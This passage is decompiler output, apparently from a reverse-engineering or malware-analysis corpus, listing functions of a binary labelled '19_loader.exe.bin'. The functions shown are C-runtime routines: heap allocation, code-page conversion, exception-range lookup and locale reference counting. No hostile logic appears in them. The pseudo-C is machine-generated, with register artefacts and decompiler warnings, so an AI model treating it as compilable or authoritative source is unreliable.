FUN_140019390(undefined8 *param_1,undefined8 param_2,int param_3,ulonglong *param_4,longlong param_5
             )

{
  longlong lVar1;
  int iVar2;
  uint uVar3;
  ulonglong uVar4;
  uint uVar5;
  longlong lVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  undefined4 uStack_3c;
  
  uVar3 = *(uint *)(param_5 + 0xc);
  iVar2 = FUN_14001e0b0(param_5,param_4);
  if (uVar3 == 0) {
                    /* WARNING: Subroutine does not return */
    FUN_1400160f8();
  }
  uVar4 = param_4[1];
  uVar7 = 0xffffffff;
  lVar6 = (longlong)*(int *)(param_5 + 0x10);
  uVar9 = 0xffffffff;
  lVar1 = uVar4 + lVar6;
  uVar5 = uVar3;
  while( true ) {
    uVar8 = uVar5 - 1;
    if ((*(int *)(uVar4 + (ulonglong)uVar8 * 0x14 + 4 + lVar6) < iVar2) &&
       (iVar2 <= *(int *)(lVar1 + 8 + (ulonglong)uVar8 * 0x14))) break;
    uVar5 = uVar8;
    if (uVar8 == 0) {
      lVar6 = 0;
LAB_14001941c:
      uVar8 = 0;
      uVar5 = uVar8;
      do {
        uVar4 = (ulonglong)uVar5;
        if ((((lVar6 == 0) ||
             ((*(int *)(lVar6 + 4) < *(int *)(lVar1 + uVar4 * 0x14) &&
              (*(int *)(lVar1 + 4 + uVar4 * 0x14) <= *(int *)(lVar6 + 8))))) &&
            (*(int *)(lVar1 + uVar4 * 0x14) <= param_3)) &&
           (param_3 <= *(int *)(lVar1 + 4 + uVar4 * 0x14))) {
          uVar9 = uVar5;
          if (uVar7 == 0xffffffff) {
            uVar7 = uVar5;
          }
        }
        uVar5 = uVar5 + 1;
      } while (uVar5 < uVar3);
      *param_1 = param_2;
      param_1[2] = param_2;
      uVar3 = uVar8;
      if (uVar7 != 0xffffffff) {
        uVar3 = uVar7;
      }
      *(uint *)(param_1 + 1) = uVar3;
      *(undefined4 *)((longlong)param_1 + 0xc) = uStack_3c;
      if (uVar7 != 0xffffffff) {
        uVar8 = uVar9 + 1;
      }
      *(undefined4 *)((longlong)param_1 + 0x1c) = uStack_3c;
      *(uint *)(param_1 + 3) = uVar8;
      return param_1;
    }
  }
  lVar6 = uVar4 + (ulonglong)(uVar5 - 1) * 0x14 + lVar6;
  goto LAB_14001941c;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x193da | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400193da rva=0x193da */

void FUN_1400193da(undefined8 param_1,uint param_2,undefined8 param_3,uint param_4,
                  undefined8 param_5)

{
  longlong lVar1;
  ulonglong uVar2;
  longlong unaff_RBX;
  uint unaff_EBP;
  int unaff_ESI;
  uint uVar3;
  longlong lVar4;
  uint uVar5;
  int in_R10D;
  longlong in_R11;
  undefined8 unaff_R12;
  undefined8 *unaff_R14;
  
  lVar1 = in_R11 + unaff_RBX;
  while( true ) {
    uVar3 = param_2 - 1;
    if ((*(int *)(in_R11 + (ulonglong)uVar3 * 0x14 + 4 + unaff_RBX) < in_R10D) &&
       (in_R10D <= *(int *)(lVar1 + 8 + (ulonglong)uVar3 * 0x14))) break;
    param_2 = uVar3;
    if (uVar3 == 0) {
      lVar4 = 0;
LAB_14001941c:
      uVar3 = 0;
      uVar5 = param_4;
      do {
        uVar2 = (ulonglong)uVar3;
        if ((((lVar4 == 0) ||
             ((*(int *)(lVar4 + 4) < *(int *)(lVar1 + uVar2 * 0x14) &&
              (*(int *)(lVar1 + 4 + uVar2 * 0x14) <= *(int *)(lVar4 + 8))))) &&
            (*(int *)(lVar1 + uVar2 * 0x14) <= unaff_ESI)) &&
           (unaff_ESI <= *(int *)(lVar1 + 4 + uVar2 * 0x14))) {
          param_4 = uVar3;
          if (uVar5 == 0xffffffff) {
            uVar5 = uVar3;
          }
        }
        uVar3 = uVar3 + 1;
      } while (uVar3 < unaff_EBP);
      *unaff_R14 = unaff_R12;
      unaff_R14[2] = unaff_R12;
      uVar3 = 0;
      if (uVar5 != 0xffffffff) {
        uVar3 = uVar5;
      }
      *(uint *)(unaff_R14 + 1) = uVar3;
      *(undefined4 *)((longlong)unaff_R14 + 0xc) = param_5._4_4_;
      uVar3 = 0;
      if (uVar5 != 0xffffffff) {
        uVar3 = param_4 + 1;
      }
      *(undefined4 *)((longlong)unaff_R14 + 0x1c) = param_5._4_4_;
      *(uint *)(unaff_R14 + 3) = uVar3;
      return;
    }
  }
  lVar4 = in_R11 + (ulonglong)(param_2 - 1) * 0x14 + unaff_RBX;
  goto LAB_14001941c;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x194a1 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400194a1 rva=0x194a1 */

void FUN_1400194a1(undefined8 param_1,int param_2,undefined8 param_3,int param_4,undefined8 param_5)

{
  int iVar1;
  uint uVar2;
  longlong unaff_RBX;
  uint unaff_EBP;
  int unaff_ESI;
  longlong unaff_RDI;
  longlong lVar3;
  ulonglong uVar4;
  longlong in_R11;
  undefined8 unaff_R12;
  undefined8 *unaff_R14;
  ulonglong unaff_R15;
  
  lVar3 = in_R11 + (ulonglong)(param_2 - 1) * 0x14 + unaff_RBX;
  uVar4 = 0;
  do {
    if ((((lVar3 == 0) ||
         ((*(int *)(lVar3 + 4) < *(int *)(unaff_RDI + uVar4 * 0x14) &&
          (*(int *)(unaff_RDI + 4 + uVar4 * 0x14) <= *(int *)(lVar3 + 8))))) &&
        (*(int *)(unaff_RDI + uVar4 * 0x14) <= unaff_ESI)) &&
       ((unaff_ESI <= *(int *)(unaff_RDI + 4 + uVar4 * 0x14) && (unaff_R15 = uVar4, param_4 == -1)))
       ) {
      param_4 = (int)uVar4;
    }
    uVar2 = (int)uVar4 + 1;
    uVar4 = (ulonglong)uVar2;
  } while (uVar2 < unaff_EBP);
  *unaff_R14 = unaff_R12;
  unaff_R14[2] = unaff_R12;
  iVar1 = 0;
  if (param_4 != -1) {
    iVar1 = param_4;
  }
  *(int *)(unaff_R14 + 1) = iVar1;
  *(undefined4 *)((longlong)unaff_R14 + 0xc) = param_5._4_4_;
  iVar1 = 0;
  if (param_4 != -1) {
    iVar1 = (int)unaff_R15 + 1;
  }
  *(undefined4 *)((longlong)unaff_R14 + 0x1c) = param_5._4_4_;
  *(int *)(unaff_R14 + 3) = iVar1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x194b7 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400194b7 rva=0x194b7 */

void thunk_FUN_1400160f8(void)

{
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x194c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400194c0 rva=0x194c0 */

undefined8 FUN_1400194c0(void)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  return *(undefined8 *)((longlong)pvVar1 + 0x60);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x194e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400194e0 rva=0x194e0 */

void FUN_1400194e0(undefined8 param_1)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar1 + 0x60) = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19500 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019500 rva=0x19500 */

undefined8 FUN_140019500(void)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  return *(undefined8 *)((longlong)pvVar1 + 0x68);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19520 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019520 rva=0x19520 */

void FUN_140019520(undefined8 param_1)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar1 + 0x68) = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19540 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019540 rva=0x19540 */

undefined8 * FUN_140019540(undefined8 *param_1,undefined8 param_2)

{
  PVOID pvVar1;
  undefined8 uVar2;
  
  *param_1 = param_2;
  pvVar1 = FUN_1400161f0();
  if (param_1 < *(undefined8 **)((longlong)pvVar1 + 0x58)) {
    pvVar1 = FUN_1400161f0();
    uVar2 = *(undefined8 *)((longlong)pvVar1 + 0x58);
  }
  else {
    uVar2 = 0;
  }
  param_1[1] = uVar2;
  pvVar1 = FUN_1400161f0();
  *(undefined8 **)((longlong)pvVar1 + 0x58) = param_1;
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19580 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019580 rva=0x19580 */

void FUN_140019580(longlong param_1)

{
  longlong lVar1;
  longlong lVar2;
  PVOID pvVar3;
  bool bVar4;
  
  pvVar3 = FUN_1400161f0();
  if (param_1 == *(longlong *)((longlong)pvVar3 + 0x58)) {
    pvVar3 = FUN_1400161f0();
    lVar2 = *(longlong *)((longlong)pvVar3 + 0x58);
    while (lVar2 != 0) {
      lVar1 = *(longlong *)(lVar2 + 8);
      bVar4 = param_1 == lVar2;
      lVar2 = lVar1;
      if (bVar4) {
        pvVar3 = FUN_1400161f0();
        *(longlong *)((longlong)pvVar3 + 0x58) = lVar1;
        return;
      }
    }
  }
                    /* WARNING: Subroutine does not return */
  FUN_1400160f8();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x195e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400195e0 rva=0x195e0 */

void FUN_1400195e0(int *param_1,longlong param_2,ULONG_PTR param_3,ulonglong *param_4)

{
  ulonglong uVar1;
  undefined8 uVar2;
  PVOID pvVar3;
  longlong local_res8 [4];
  
  uVar1 = param_4[1];
  local_res8[0] = param_2;
  pvVar3 = FUN_1400161f0();
  *(ulonglong *)((longlong)pvVar3 + 0x60) = uVar1;
  uVar2 = *(undefined8 *)(param_1 + 0xe);
  pvVar3 = FUN_1400161f0();
  *(undefined8 *)((longlong)pvVar3 + 0x68) = uVar2;
  pvVar3 = FUN_1400161f0();
  FUN_14001e9f0(param_1,local_res8,param_3,param_4,
                (uint *)((ulonglong)*(uint *)param_4[7] + *(longlong *)((longlong)pvVar3 + 0x60)),0,
                0,0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19660 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019660 rva=0x19660 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_140019660(undefined4 *param_1,undefined8 param_2,undefined8 param_3)

{
  PVOID pvVar1;
  undefined4 *local_28;
  undefined8 local_20;
  
  local_28 = param_1;
  local_20 = param_3;
  pvVar1 = FUN_1400161f0();
  (**(code **)((longlong)pvVar1 + 0x10))(*param_1,&local_28);
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x196b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400196b0 rva=0x196b0 */

void FUN_1400196b0(longlong param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_1400e0498) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_1400e04a0) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x28) != PTR_DAT_1400e04a8) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x28));
    }
    if (*(undefined **)(param_1 + 0x30) != PTR_DAT_1400e04b0) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x30));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_1400e04b8) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_1400e04c0) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_1400e04c8) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x68) != PTR_DAT_1400e04e8) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x68));
    }
    if (*(undefined **)(param_1 + 0x70) != PTR_DAT_1400e04f0) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x70));
    }
    if (*(undefined **)(param_1 + 0x78) != PTR_DAT_1400e04f8) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x78));
    }
    if (*(undefined **)(param_1 + 0x80) != PTR_DAT_1400e0500) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x80));
    }
    if (*(undefined **)(param_1 + 0x88) != PTR_DAT_1400e0508) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x88));
    }
    if (*(undefined **)(param_1 + 0x90) != PTR_DAT_1400e0510) {
      FUN_140017fb0(*(undefined **)(param_1 + 0x90));
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x197bc | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400197bc rva=0x197bc */

void FUN_1400197bc(longlong *param_1)

{
  if (param_1 != (longlong *)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_1400e0480) {
      FUN_140017fb0((undefined *)*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_1400e0488) {
      FUN_140017fb0((undefined *)param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_1400e0490) {
      FUN_140017fb0((undefined *)param_1[2]);
    }
    if ((undefined *)param_1[0xb] != PTR_DAT_1400e04d8) {
      FUN_140017fb0((undefined *)param_1[0xb]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_1400e04e0) {
      FUN_140017fb0((undefined *)param_1[0xc]);
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19828 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019828 rva=0x19828 */

void FUN_140019828(undefined8 *param_1)

{
  if (param_1 != (undefined8 *)0x0) {
    FUN_140019930(param_1,7);
    FUN_140019930(param_1 + 7,7);
    FUN_140019930(param_1 + 0xe,0xc);
    FUN_140019930(param_1 + 0x1a,0xc);
    FUN_140019930(param_1 + 0x26,2);
    FUN_140017fb0((LPVOID)param_1[0x28]);
    FUN_140017fb0((LPVOID)param_1[0x29]);
    FUN_140017fb0((LPVOID)param_1[0x2a]);
    FUN_140019930(param_1 + 0x2c,7);
    FUN_140019930(param_1 + 0x33,7);
    FUN_140019930(param_1 + 0x3a,0xc);
    FUN_140019930(param_1 + 0x46,0xc);
    FUN_140019930(param_1 + 0x52,2);
    FUN_140017fb0((LPVOID)param_1[0x54]);
    FUN_140017fb0((LPVOID)param_1[0x55]);
    FUN_140017fb0((LPVOID)param_1[0x56]);
    FUN_140017fb0((LPVOID)param_1[0x57]);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19930 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019930 rva=0x19930 */

void FUN_140019930(undefined8 *param_1,longlong param_2)

{
  undefined8 *puVar1;
  
  puVar1 = param_1 + param_2;
  for (; param_1 != puVar1; param_1 = param_1 + 1) {
    FUN_140017fb0((LPVOID)*param_1);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19970 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019970 rva=0x19970 */

void FUN_140019970(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(2);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19980 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019980 rva=0x19980 */

LPVOID FUN_140019980(ulonglong param_1,ulonglong param_2)

{
  bool bVar1;
  int iVar2;
  undefined7 extraout_var;
  LPVOID pvVar3;
  undefined8 *puVar4;
  SIZE_T dwBytes;
  
  if ((param_1 == 0) || (param_2 <= 0xffffffffffffffe0 / param_1)) {
    dwBytes = param_1 * param_2;
    if (dwBytes == 0) {
      dwBytes = 1;
    }
    do {
      pvVar3 = HeapAlloc(DAT_1400e0d30,8,dwBytes);
      if (pvVar3 != (LPVOID)0x0) {
        return pvVar3;
      }
      iVar2 = FUN_140015f20();
    } while ((iVar2 != 0) &&
            (bVar1 = FUN_140018520(dwBytes), (int)CONCAT71(extraout_var,bVar1) != 0));
  }
  puVar4 = FUN_140018dec();
  *(undefined4 *)puVar4 = 0xc;
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19a00 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019a00 rva=0x19a00 */

LPVOID FUN_140019a00(ulonglong param_1)

{
  bool bVar1;
  int iVar2;
  undefined7 extraout_var;
  LPVOID pvVar3;
  undefined8 *puVar4;
  
  if (param_1 < 0xffffffffffffffe1) {
    if (param_1 == 0) {
      param_1 = 1;
    }
    do {
      pvVar3 = HeapAlloc(DAT_1400e0d30,0,param_1);
      if (pvVar3 != (LPVOID)0x0) {
        return pvVar3;
      }
      iVar2 = FUN_140015f20();
    } while ((iVar2 != 0) &&
            (bVar1 = FUN_140018520(param_1), (int)CONCAT71(extraout_var,bVar1) != 0));
  }
  puVar4 = FUN_140018dec();
  *(undefined4 *)puVar4 = 0xc;
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19a60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019a60 rva=0x19a60 */

int FUN_140019a60(ushort *param_1,ushort *param_2,longlong param_3)

{
  if (param_3 == 0) {
    return 0;
  }
  for (; ((param_3 = param_3 + -1, param_3 != 0 && (*param_1 != 0)) && (*param_1 == *param_2));
      param_1 = param_1 + 1) {
    param_2 = param_2 + 1;
  }
  return (uint)*param_1 - (uint)*param_2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19a94 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019a94 rva=0x19a94 */

void FUN_140019a94(undefined4 *param_1,DWORD param_2,LPCSTR param_3,int param_4,LPWORD param_5,
                  UINT param_6,int param_7)

{
  int iVar1;
  longlong lVar2;
  undefined4 *puVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  undefined1 (*lpSrcStr) [32];
  undefined1 *puVar6;
  undefined1 *puVar7;
  undefined1 *puVar8;
  undefined1 auStackY_88 [32];
  undefined4 local_58 [2];
  longlong local_50;
  longlong local_48;
  char local_38;
  ulonglong local_30;
  
  local_30 = DAT_1400dfc40 ^ (ulonglong)local_58;
  FUN_14001743c(&local_50,param_1);
  if (param_6 == 0) {
    param_6 = *(UINT *)(local_48 + 0xc);
  }
  iVar1 = FUN_140019c24(param_6,(-(uint)(param_7 != 0) & 8) + 1,param_3,param_4,(LPWSTR)0x0,0);
  puVar7 = auStackY_88;
  puVar8 = auStackY_88;
  if (iVar1 == 0) goto LAB_140019bea;
  uVar5 = (longlong)iVar1 * 2;
  uVar4 = -(ulonglong)(uVar5 < uVar5 + 0x10) & uVar5 + 0x10;
  if (uVar4 == 0) {
    lpSrcStr = (undefined1 (*) [32])0x0;
LAB_140019bd2:
    puVar8 = puVar7;
    if (lpSrcStr == (undefined1 (*) [32])0x0) goto LAB_140019bea;
  }
  else {
    if (uVar4 < 0x401) {
      lVar2 = FUN_140013c00();
      lVar2 = -lVar2;
      puVar7 = auStackY_88 + lVar2;
      puVar6 = auStackY_88 + lVar2;
      puVar3 = (undefined4 *)((longlong)local_58 + lVar2);
      lpSrcStr = (undefined1 (*) [32])0x0;
      if (puVar3 == (undefined4 *)0x0) goto LAB_140019bd2;
      *puVar3 = 0xcccc;
LAB_140019b80:
      lpSrcStr = (undefined1 (*) [32])(puVar3 + 4);
      puVar7 = puVar6;
    }
    else {
      puVar3 = FUN_140019a00(uVar4);
      puVar7 = auStackY_88;
      puVar6 = auStackY_88;
      lpSrcStr = (undefined1 (*) [32])0x0;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_140019b80;
      }
    }
    if (lpSrcStr == (undefined1 (*) [32])0x0) goto LAB_140019bd2;
    *(undefined8 *)(puVar7 + -8) = 0x140019b96;
    FUN_1400225e0(lpSrcStr,0,uVar5);
    *(int *)(puVar7 + 0x28) = iVar1;
    *(undefined1 (**) [32])(puVar7 + 0x20) = lpSrcStr;
    *(undefined8 *)(puVar7 + -8) = 0x140019bb2;
    iVar1 = FUN_140019c24(param_6,1,param_3,param_4,*(LPWSTR *)(puVar7 + 0x20),
                          *(int *)(puVar7 + 0x28));
    if (iVar1 == 0) goto LAB_140019bd2;
    *(undefined8 *)(puVar7 + -8) = 0x140019bcc;
    GetStringTypeW(param_2,(LPCWSTR)lpSrcStr,iVar1,param_5);
  }
  puVar8 = puVar7;
  if (*(int *)(lpSrcStr[-1] + 0x10) == 0xdddd) {
    *(undefined8 *)(puVar7 + -8) = 0x140019bea;
    FUN_140017fb0(lpSrcStr[-1] + 0x10);
  }
LAB_140019bea:
  if (local_38 != '\0') {
    *(uint *)(local_50 + 0x3a8) = *(uint *)(local_50 + 0x3a8) & 0xfffffffd;
  }
  uVar5 = local_30 ^ (ulonglong)local_58;
  *(undefined8 *)(puVar8 + -8) = 0x140019c09;
  FUN_14001a2d0(uVar5);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19c24 | partial_markers_remain ===== */
/* address=140019c24 rva=0x19c24 */

void FUN_140019c24(UINT param_1,DWORD param_2,LPCSTR param_3,int param_4,LPWSTR param_5,int param_6)

{
  bool bVar1;
  
  if (param_1 < 0xdead) {
    if (param_1 != 0xdeac) {
      if (param_1 < 0xc434) {
        if ((((param_1 != 0xc433) && (param_1 != 0x2a)) && (param_1 != 0xc42c)) &&
           ((param_1 != 0xc42d && (param_1 != 0xc42e)))) {
          bVar1 = param_1 == 0xc431;
LAB_140019c71:
          if (!bVar1) goto LAB_140019c75;
        }
      }
      else if (param_1 != 0xc435) {
        if (param_1 == 0xd698) goto LAB_140019caf;
        if (param_1 != 0xdeaa) {
          bVar1 = param_1 == 0xdeab;
          goto LAB_140019c71;
        }
      }
    }
  }
  else if ((((param_1 != 0xdead) && (param_1 != 0xdeae)) && (param_1 != 0xdeaf)) &&
          (((param_1 != 0xdeb0 && (param_1 != 0xdeb1)) &&
           ((param_1 != 0xdeb2 && ((param_1 != 0xdeb3 && (param_1 != 65000)))))))) {
    if (param_1 != 0xfde9) goto LAB_140019c75;
LAB_140019caf:
    param_2 = param_2 & 8;
    goto LAB_140019c75;
  }
  param_2 = 0;
LAB_140019c75:
                    /* WARNING: Could not recover jumptable at 0x000140019c75. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  MultiByteToWideChar(param_1,param_2,param_3,param_4,param_5,param_6);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19cb4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019cb4 rva=0x19cb4 */

void FUN_140019cb4(longlong param_1)

{
  int *piVar1;
  undefined8 *puVar2;
  longlong lVar3;
  
  LOCK();
  *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
  UNLOCK();
  piVar1 = *(int **)(param_1 + 0xe0);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  piVar1 = *(int **)(param_1 + 0xf0);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  piVar1 = *(int **)(param_1 + 0xe8);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  piVar1 = *(int **)(param_1 + 0x100);
  if (piVar1 != (int *)0x0) {
    LOCK();
    *piVar1 = *piVar1 + 1;
    UNLOCK();
  }
  puVar2 = (undefined8 *)(param_1 + 0x38);
  lVar3 = 6;
  do {
    if (((undefined *)puVar2[-2] != &DAT_1400e0368) &&
       (piVar1 = (int *)*puVar2, piVar1 != (int *)0x0)) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    if ((puVar2[-3] != 0) && (piVar1 = (int *)puVar2[-1], piVar1 != (int *)0x0)) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    puVar2 = puVar2 + 4;
    lVar3 = lVar3 + -1;
  } while (lVar3 != 0);
  FUN_140019f60(*(undefined ***)(param_1 + 0x120));
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19d40 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019d40 rva=0x19d40 */

void FUN_140019d40(longlong param_1)

{
  int *piVar1;
  undefined8 *puVar2;
  longlong lVar3;
  
  if (param_1 != 0) {
    LOCK();
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
    UNLOCK();
    piVar1 = *(int **)(param_1 + 0xe0);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
      UNLOCK();
    }
    piVar1 = *(int **)(param_1 + 0xf0);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
      UNLOCK();
    }
    piVar1 = *(int **)(param_1 + 0xe8);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
      UNLOCK();
    }
    piVar1 = *(int **)(param_1 + 0x100);
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + -1;
      UNLOCK();
    }
    puVar2 = (undefined8 *)(param_1 + 0x38);
    lVar3 = 6;
    do {
      if (((undefined *)puVar2[-2] != &DAT_1400e0368) &&
         (piVar1 = (int *)*puVar2, piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
        UNLOCK();
      }
      if ((puVar2[-3] != 0) && (piVar1 = (int *)puVar2[-1], piVar1 != (int *)0x0)) {
        LOCK();
        *piVar1 = *piVar1 + -1;
        UNLOCK();
      }
      puVar2 = puVar2 + 4;
      lVar3 = lVar3 + -1;
    } while (lVar3 != 0);
    FUN_140019f88(*(undefined ***)(param_1 + 0x120));
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19de8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019de8 rva=0x19de8 */

void FUN_140019de8(longlong param_1)

{
  int *piVar1;
  longlong lVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  
  if ((((*(undefined ***)(param_1 + 0xf8) != (undefined **)0x0) &&
       (*(undefined ***)(param_1 + 0xf8) != &PTR_DAT_1400e0480)) &&
      (*(int **)(param_1 + 0xe0) != (int *)0x0)) && (**(int **)(param_1 + 0xe0) == 0)) {
    piVar1 = *(int **)(param_1 + 0xf0);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FUN_140017fb0(piVar1);
      FUN_1400196b0(*(longlong *)(param_1 + 0xf8));
    }
    piVar1 = *(int **)(param_1 + 0xe8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      FUN_140017fb0(piVar1);
      FUN_1400197bc(*(longlong **)(param_1 + 0xf8));
    }
    FUN_140017fb0(*(LPVOID *)(param_1 + 0xe0));
    FUN_140017fb0(*(LPVOID *)(param_1 + 0xf8));
  }
  if ((*(int **)(param_1 + 0x100) != (int *)0x0) && (**(int **)(param_1 + 0x100) == 0)) {
    FUN_140017fb0((LPVOID)(*(longlong *)(param_1 + 0x108) + -0xfe));
    FUN_140017fb0((LPVOID)(*(longlong *)(param_1 + 0x110) + -0x80));
    FUN_140017fb0((LPVOID)(*(longlong *)(param_1 + 0x118) + -0x80));
    FUN_140017fb0(*(LPVOID *)(param_1 + 0x100));
  }
  FUN_140019fb0(*(undefined ***)(param_1 + 0x120));
  puVar3 = (undefined8 *)(param_1 + 0x128);
  lVar2 = 6;
  puVar4 = (undefined8 *)(param_1 + 0x38);
  do {
    if ((((undefined *)puVar4[-2] != &DAT_1400e0368) &&
        (piVar1 = (int *)*puVar4, piVar1 != (int *)0x0)) && (*piVar1 == 0)) {
      FUN_140017fb0(piVar1);
      FUN_140017fb0((LPVOID)*puVar3);
    }
    if (((puVar4[-3] != 0) && (piVar1 = (int *)puVar4[-1], piVar1 != (int *)0x0)) && (*piVar1 == 0))
    {
      FUN_140017fb0(piVar1);
    }
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 4;
    lVar2 = lVar2 + -1;
  } while (lVar2 != 0);
  FUN_140017fb0((LPVOID)param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19f60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019f60 rva=0x19f60 */

int FUN_140019f60(undefined **param_1)

{
  int *piVar1;
  int iVar2;
  
  if ((param_1 == (undefined **)0x0) || (param_1 == &PTR_DAT_14008c0e0)) {
    return 0x7fffffff;
  }
  LOCK();
  piVar1 = (int *)((longlong)param_1 + 0x15c);
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + 1;
  UNLOCK();
  return iVar2 + 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19f88 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019f88 rva=0x19f88 */

int FUN_140019f88(undefined **param_1)

{
  int *piVar1;
  int iVar2;
  
  if ((param_1 == (undefined **)0x0) || (param_1 == &PTR_DAT_14008c0e0)) {
    return 0x7fffffff;
  }
  LOCK();
  piVar1 = (int *)((longlong)param_1 + 0x15c);
  iVar2 = *piVar1;
  *piVar1 = *piVar1 + -1;
  UNLOCK();
  return iVar2 + -1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x19fb0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140019fb0 rva=0x19fb0 */

void FUN_140019fb0(undefined **param_1)

{
